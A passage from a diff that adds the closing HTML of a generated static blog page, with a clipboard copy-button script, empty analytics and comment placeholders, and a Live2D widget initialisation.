+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
